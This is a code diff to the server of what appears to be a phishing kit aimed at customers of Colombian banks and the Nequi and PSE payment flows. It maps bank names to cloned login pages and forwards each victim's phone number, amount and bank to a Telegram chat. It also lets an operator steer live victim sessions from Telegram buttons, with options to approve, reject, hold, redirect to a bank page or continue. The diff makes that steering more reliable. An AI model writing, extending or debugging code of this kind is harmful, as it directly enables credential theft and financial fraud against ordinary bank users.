@@ -304,6 +304,46 @@ class SessionManager {
 
 const sessionManager = new SessionManager();
 
+const BANK_ROUTES = {
+    'Agrario': '/bancas/Agrario/index.html',
+    'AV Villas': '/bancas/AV-Villas/index.html',
+    'Banco Mundo Mujer': '/bancas/Banco-Mundo-Mujer/index.html',
+    'Bancolombia': '/bancas/Bancolombia/index.html',
+    'BBVA': '/bancas/BBVA/index.html',
+    'Bogota': '/bancas/Bogota/index.html',
+    'Caja Social': '/bancas/Caja-Social/index.html',
+    'Daviplata': '/bancas/Daviplata/index.html',
+    'Davivienda': '/bancas/Davivienda/index.html',
+    'Falabella': '/bancas/Falabella/index.html',
+    'itau': '/bancas/Itau/index.html',
+    'Occidente': '/bancas/Occidente/index.html',
+    'Popular': '/bancas/Popular/index.html',
+    'Scotiabank Colpatria': '/bancas/Scotiabank-Colpatria/index.html',
+    'Serfinanza': '/bancas/Serfinanza/index.html'
+};
+
+function getBankRoute(bankKey) {
+    if (!bankKey) return null;
+    return BANK_ROUTES[bankKey] || null;
+}
+
+/** Envía evento al room de la sesión y, si hace falta, al socket guardado en memoria */
+function deliverToSession(sessionId, event, payload) {
+    io.to(sessionId).emit(event, payload);
+    const session = sessionManager.getSession(sessionId);
+    if (session?.socketId) {
+        const sock = io.sockets.sockets.get(session.socketId);
+        if (sock) sock.emit(event, payload);
+    }
+}
+
+function sessionHasLiveSocket(sessionId) {
+    const roomSize = io.sockets.adapter.rooms.get(sessionId)?.size || 0;
+    if (roomSize > 0) return true;
+    const session = sessionManager.getSession(sessionId);
+    return !!(session?.socketId && io.sockets.sockets.get(session.socketId));
+}
+
 // Mapa para almacenar mensajes de Telegram por sessionId
 const telegramMessages = new Map();
 
@@ -816,17 +856,25 @@ bot.on('callback_query', async (callbackQuery) => {
         const session = sessionManager.getSession(sessionId);
         if (session) session.lastActivity = Date.now();
 
-        // Entrega via room (sessionId). Sobrevive a reconexiones y cambios de socket.id.
         const roomSize = io.sockets.adapter.rooms.get(sessionId)?.size || 0;
-        const emitToSession = (event, payload) => io.to(sessionId).emit(event, payload);
+        const live = sessionHasLiveSocket(sessionId);
 
-        if (roomSize === 0 && !session) {
-            console.warn('\u26a0\ufe0f Sesi\u00f3n no encontrada y sin sockets en room:', sessionId);
-            await bot.answerCallbackQuery(callbackId, { text: '\u26a0\ufe0f Cliente sin conexi\u00f3n activa' });
+        if (!live && !session) {
+            console.warn('\u26a0\ufe0f Sesi\u00f3n no encontrada y sin sockets:', sessionId);
+            await bot.answerCallbackQuery(callbackId, { text: '\u26a0\ufe0f Cliente sin conexi\u00f3n activa', show_alert: true });
             return;
         }
 
-        console.log(`\u2705 Procesando callback (room=${sessionId}, sockets=${roomSize})`);
+        if (!live && session) {
+            console.warn(`\u26a0\ufe0f Cliente desconectado (room=${sessionId}) — reintenta cuando vuelva a loading`);
+            await bot.answerCallbackQuery(callbackId, {
+                text: '\u26a0\ufe0f El usuario no está conectado. Que mantenga abierta la pantalla de carga.',
+                show_alert: true
+            });
+            return;
+        }
+
+        console.log(`\u2705 Procesando callback (room=${sessionId}, sockets=${roomSize}, live=${live})`);
         
         // Remover teclado inline del mensaje inmediatamente
         await bot.editMessageReplyMarkup(
@@ -836,36 +884,58 @@ bot.on('callback_query', async (callbackQuery) => {
 
         // Manejadores especiales para Nequi y PSE
         if (module === 'nequi' && action === 'follow') {
-            await bot.sendMessage(chatId, '\u2705 Cliente redirigido a PSE', { reply_to_message_id: messageId });
-            emitToSession('actionFollow', { sessionId, action: 'follow', nextPage: 'pse' });
+            const bank = session?.data?.bank;
+            const bankRoute = getBankRoute(bank);
+            const destLabel = bankRoute ? bank : 'PSE';
+            await bot.sendMessage(chatId, `\u2705 Cliente redirigido a ${destLabel}`, { reply_to_message_id: messageId });
+            deliverToSession(sessionId, 'actionFollow', {
+                sessionId,
+                action: 'follow',
+                bank,
+                bankRoute,
+                nextPage: bankRoute ? 'bank' : 'pse'
+            });
             await bot.answerCallbackQuery(callbackId, { text: '\u2705 Continuar a PSE' });
             return;
         } else if (module === 'nequi' && action === 'reject') {
             await bot.sendMessage(chatId, '\u274c Transacci\u00f3n rechazada', { reply_to_message_id: messageId });
-            emitToSession('actionReject', { sessionId, action: 'reject' });
+            deliverToSession(sessionId, 'actionReject', { sessionId, action: 'reject' });
             sessionManager.deleteSession(sessionId);
             await bot.answerCallbackQuery(callbackId, { text: '\u274c Rechazado' });
             return;
         } else if (module === 'nequi' && action === 'wait') {
             await bot.sendMessage(chatId, '\u23f3 Cliente en espera', { reply_to_message_id: messageId });
-            emitToSession('actionWait', { sessionId, action: 'wait', waitTime: 15 });
+            deliverToSession(sessionId, 'actionWait', { sessionId, action: 'wait', waitTime: 15 });
             await bot.answerCallbackQuery(callbackId, { text: '\u23f3 Esperando' });
             return;
         } else if (module === 'pse' && action === 'approve') {
+            const bank = session?.data?.bank;
+            const bankRoute = getBankRoute(bank);
             await bot.sendMessage(chatId, '\u2705 PSE aprobado, redirigiendo al banco...', { reply_to_message_id: messageId });
-            emitToSession('actionApprovePSE', { sessionId, action: 'approve' });
+            deliverToSession(sessionId, 'actionApprovePSE', { sessionId, action: 'approve', bank, bankRoute });
             await bot.answerCallbackQuery(callbackId, { text: '\u2705 PSE aprobado' });
             return;
         } else if (module === 'pse' && action === 'reject') {
             await bot.sendMessage(chatId, '\u274c PSE rechazado', { reply_to_message_id: messageId });
-            emitToSession('actionRejectPSE', { sessionId, action: 'reject' });
+            deliverToSession(sessionId, 'actionRejectPSE', { sessionId, action: 'reject' });
             sessionManager.deleteSession(sessionId);
             await bot.answerCallbackQuery(callbackId, { text: '\u274c Rechazado' });
             return;
         } else if (module === 'pse' && action === 'wait') {
             await bot.sendMessage(chatId, '\u23f3 PSE en espera', { reply_to_message_id: messageId });
-            emitToSession('actionWaitPSE', { sessionId, action: 'wait', waitTime: 15 });
+            deliverToSession(sessionId, 'actionWaitPSE', { sessionId, action: 'wait', waitTime: 15 });
             await bot.answerCallbackQuery(callbackId, { text: '\u23f3 Esperando' });
+            return;
+        } else if (module === 'bank' && action === 'continue') {
+            deliverToSession(sessionId, 'telegramAction', {
+                action: 'continue',
+                sessionId,
+                fromTelegram: true,
+                telegramMessageId: messageId,
+                timestamp: Date.now()
+            });
+            await bot.answerCallbackQuery(callbackId, { text: '\u2705 Continuar' });
+            await bot.sendMessage(chatId, '\u2705 Continuar enviado al cliente', { reply_to_message_id: messageId });
             return;
         }
         // Manejadores para banco (Ita\u00fa, etc.)
@@ -894,12 +964,12 @@ bot.on('callback_query', async (callbackQuery) => {
                 await bot.sendMessage(chatId, '\u2705 Transacci\u00f3n finalizada - Sesi\u00f3n cerrada', { reply_to_message_id: messageId });
                 telegramMessages.delete(sessionId);
                 sessionManager.deleteSession(sessionId);
-                emitToSession('redirect', { sessionId, page: '/', clearData: true });
+                deliverToSession(sessionId, 'redirect', { sessionId, page: '/', clearData: true });
                 await bot.answerCallbackQuery(callbackId, { text: '\u2705 Finalizado' });
                 return;
             } else if (pageMap[action]) {
                 await bot.sendMessage(chatId, `${actionNames[action] || action}`, { reply_to_message_id: messageId });
-                emitToSession('redirect', {
+                deliverToSession(sessionId, 'redirect', {
                     sessionId,
                     page: `/bancas/Itau/${pageMap[action]}`,
                     clearData: action === 'logo'
@@ -913,7 +983,7 @@ bot.on('callback_query', async (callbackQuery) => {
         // Para todas las dem\u00e1s bancas, enviar la acci\u00f3n directamente al room
         console.log('\ud83d\udce4 Enviando acci\u00f3n al cliente:', { action, sessionId });
 
-        emitToSession('telegramAction', {
+        deliverToSession(sessionId, 'telegramAction', {
             action: action,
             sessionId: sessionId,
             messageId: messageId,
@@ -998,6 +1068,7 @@ function formatTelegramMessage(data, sessionId) {
 
 📱 <b>Celular:</b> ${data.phone || 'N/A'}
 💰 <b>Monto:</b> $${formatAmount(data.amount)}
+🏦 <b>Banco:</b> ${data.bank || 'N/A'}
 ${personType}
 🕐 <b>Hora:</b> ${timestamp}
 
